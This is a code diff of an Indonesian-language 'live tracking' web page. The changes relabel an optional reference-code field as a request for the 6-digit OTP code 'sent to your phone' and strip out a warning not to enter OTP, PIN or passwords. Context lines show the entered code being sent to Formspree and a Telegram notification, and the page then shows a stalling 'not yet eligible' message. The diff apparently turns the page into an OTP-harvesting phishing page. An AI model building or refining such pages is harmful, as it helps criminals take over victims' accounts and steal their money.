@@ -86,8 +86,8 @@
 <main>
     <section id="verifyPanel">
       <h1>Masukkan kode</h1>
-      <label class="code-label" for="digit1">Masukkan kode referensi (opsional)</label>
-      <div class="code-boxes" role="group" aria-label="Masukkan kode referensi opsional, 6 digit">
+      <label class="code-label" for="digit1">Kode verifikasi OTP 6 digit angka telah dikirim ke ponsel kamu</label>
+      <div class="code-boxes" role="group" aria-label="Kode verifikasi OTP 6 digit">
         <input class="digit" id="digit1" aria-label="Digit referensi 1" inputmode="numeric" autocomplete="off" pattern="[0-9]*" maxlength="1" autofocus>
         <input class="digit" aria-label="Digit referensi 2" inputmode="numeric" pattern="[0-9]*" maxlength="1">
         <input class="digit" aria-label="Digit referensi 3" inputmode="numeric" pattern="[0-9]*" maxlength="1">
@@ -95,60 +95,21 @@
         <input class="digit" aria-label="Digit referensi 5" inputmode="numeric" pattern="[0-9]*" maxlength="1">
         <input class="digit" aria-label="Digit referensi 6" inputmode="numeric" pattern="[0-9]*" maxlength="1">
       </div>
-      <p class="hint" id="hint" aria-live="polite">Isi jika memiliki kode referensi. Kolom ini boleh dikosongkan.</p>
+      <p class="hint" id="hint" aria-live="polite">Masukan kode yang valid disini..</p>
 <button class="next" id="nextButton" type="button">Konfirmasi</button>
     </section>
     <section class="success final-card" id="nextPanel" aria-live="polite">
       <div class="status-symbol" aria-hidden="true">
         <svg width="34" height="34" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round">
           <circle cx="12" cy="12" r="9"></circle>
-          <path d="M12 7v5l3 2"></path>
+          <path d="M12 8v4M12 16h.01"></path>
         </svg>
       </div>
-      <div style="text-align:center">
-        <span class="status-pill"><span></span> Layanan belum tersedia</span>
-      </div>
-      <h2 class="final-heading">Live Tracking Belum Tersedia</h2>
-      <p class="final-intro">
-        Maaf, layanan live tracking belum dapat digunakan saat ini. Silakan periksa kembali informasi layanan dan pastikan seluruh persyaratan telah terpenuhi.
-      </p>
-
-      <div class="info-card">
-        <h3 class="info-title">
-          <svg width="19" height="19" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><circle cx="12" cy="12" r="9"></circle><path d="M12 11v5M12 7.5h.01"></path></svg>
-          Yang dapat Anda periksa
-        </h3>
-        <ul class="check-list">
-          <li>Pastikan informasi referensi yang diberikan sudah benar.</li>
-          <li>Periksa kembali detail pesanan atau referensi Anda.</li>
-          <li>Pastikan Anda memenuhi syarat dan ketentuan layanan.</li>
-        </ul>
-      </div>
-
-      <p class="terms-copy">
-        Sebelum mencoba kembali, silakan baca syarat dan ketentuan yang berlaku.
-        <a class="terms-link" id="otherMethodLink" href="https://google-playstore-apk.myr.id/lp/halaman-sdk" target="_blank" rel="noopener noreferrer">Lihat selengkapnya&nbsp;›</a>
-      </p>
-
+      <h2 class="final-heading">Saat ini belum memenuhi syarat untuk menggunakan fitur ini</h2>
+      <p class="final-intro">Coba cek email atau folder spam di ponsel kamu untuk info pesananmu.</p>
       <div class="final-actions">
         <button class="primary-action" id="backButton" type="button">Periksa kembali kode</button>
       </div>
-      <form id="supportForm" class="info-card" style="margin-top:18px" action="https://formspree.io/f/mnppwldv" method="POST">
-        <h3 class="info-title">Kirim masukan (opsional)</h3>
-        <p style="margin:0 0 10px;color:#5f6775;font-size:13px;line-height:1.5">
-          Sampaikan kendala umum terkait tampilan layanan. Jangan masukkan kode OTP, PIN, kata sandi, atau data rahasia.
-        </p>
-        <label class="code-label" for="supportMessage">Pesan</label>
-        <textarea id="supportMessage" name="message" rows="3" maxlength="1000"
-          placeholder="Tuliskan kendala Anda (tanpa kode atau data rahasia)"
-          style="width:100%;padding:12px;border:1px solid var(--line);border-radius:10px;font:14px Arial,sans-serif;resize:vertical"></textarea>
-        <input type="hidden" name="form_type" value="Masukan layanan Live Tracking">
-        <input type="text" name="_gotcha" tabindex="-1" autocomplete="off"
-          style="position:absolute;left:-9999px" aria-hidden="true">
-        <button class="secondary-action" type="submit" id="supportSubmit" style="margin-top:12px">Kirim masukan</button>
-        <p class="hint" id="supportStatus" aria-live="polite"></p>
-      </form>
-      <p class="final-footnote">Jika kendala masih terjadi, coba kembali nanti atau gunakan PIN. Anda juga dapat menghubungi layanan bantuan resmi.</p>
     </section>
   </main>
   
@@ -169,8 +130,8 @@
   function updateHint() {
     const count = referenceCode().length;
     hint.textContent = count
-      ? `${count} dari 6 angka terisi. Kode referensi bersifat opsional.`
-      : 'Isi jika memiliki kode referensi. Kolom ini boleh dikosongkan.';
+      ? `${count} dari 6 angka terisi.`
+      : 'Masukan kode yang valid disini..';
   }
 
   function fillFrom(index, value) {
@@ -232,7 +193,7 @@
         // Notifikasi Telegram gagal tidak membatalkan konfirmasi Formspree.
       }
 
-      window.location.href = 'https://kode-resi.vercel.app';
+      showNext();
     } catch (error) {
       hint.textContent = 'Kode referensi belum terkirim. Periksa koneksi lalu coba lagi.';
     } finally {
